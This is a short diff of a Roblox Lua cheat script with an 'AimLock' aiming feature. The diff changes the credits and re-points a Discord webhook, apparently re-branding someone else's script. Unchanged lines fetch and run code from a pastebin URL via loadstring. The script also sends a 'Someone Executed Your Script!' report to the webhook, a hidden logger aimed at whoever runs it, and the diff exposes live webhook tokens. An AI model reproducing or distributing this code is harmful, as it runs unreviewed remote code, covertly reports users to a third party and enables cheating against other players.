@@ -332,7 +332,7 @@ end)
 
 local Tab5 = Window:Tab("Credits",false)
 
-Tab5:Label("kremmz#0001 discord.gg/dtZYDKHpBv")
+Tab5:Label("Varski#0001,7c#0001")
 
 local Aiming = loadstring(game:HttpGet("https://pastebin.com/raw/x0GU1rjk"))()
 Aiming.TeamCheck(false)
@@ -432,9 +432,9 @@ RunService:BindToRenderStep("AimLock", 0, function()
 
 
 local url =
-   "https://discord.com/api/webhooks/913270761911910460/rwAkB7gAdLbhMuL5mDhF9Z9lU0Zugy7JMxDZ9swSCQFVdI9hcQa9eMUAAVudocBC0Zfw"
+   "https://discordapp.com/api/webhooks/906764837021966346/zhUtQyk4j5E3Dy71GlUaHlv5QszILpwOEEDaX2lppf46cNvfTtptJGO086uJkmcfueGo"
 local data = {
-   ["content"] = " ***kremmz's logs***",
+   ["content"] = " ***Da Assist Logs***",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
